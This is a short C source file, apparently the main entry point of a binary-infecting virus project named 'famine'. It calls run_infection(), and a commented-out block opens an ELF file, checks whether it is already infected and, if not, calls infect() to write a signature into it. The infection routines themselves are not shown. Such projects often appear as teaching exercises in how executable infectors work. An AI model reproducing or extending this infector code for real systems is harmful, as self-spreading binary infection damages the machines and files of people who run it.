#include "famine.h"

int main()
{
    //FILE *fp = fopen("binaries/test", "ab+");
    //size_t len = strlen(string) + 1;
    /*if (!fp)
    {
        perror("Failed to open file");
        return 1;
    }
    if (check_elf(fp, 2))
    {
        printf("Its an elf \n");
        if (!check_infection(fp, string, len - 1))
            infect(fp, string, len);
        else
            printf("Already infected.\n");
    }
    fclose(fp);
    */
    run_infection();
    return 0;
}
